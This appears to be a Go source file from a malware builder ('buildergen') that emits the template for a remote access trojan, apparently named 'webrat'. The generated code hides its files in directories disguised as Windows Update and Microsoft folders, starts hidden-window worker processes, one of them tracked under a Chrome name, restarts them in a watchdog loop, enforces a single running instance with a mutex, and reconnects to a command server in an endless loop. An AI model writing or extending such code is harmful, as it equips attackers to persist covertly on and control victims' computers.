package buildergen

import (
	"fmt"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	_ = setupLogger()

	rand.Seed(time.Now().UnixNano())

	var chromePid int
	var updatePid int

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(chromePid) {
				chromePid = startWorker(getWorkerExeName())
			}
			if !isProcessRunning(updatePid) {
				updatePid = startWorker(getServiceExeName())
			}
		}
	}()

	for {
		connectToServer()
		time.Sleep(5 * time.Second)
	}
}

func startWorker(exeName string) int {
	cmd := exec.Command(exeName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return 0
	}
	return cmd.Process.Pid
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func setupLogger() *os.File { return nil }
`, delay, buildID, buildID))
}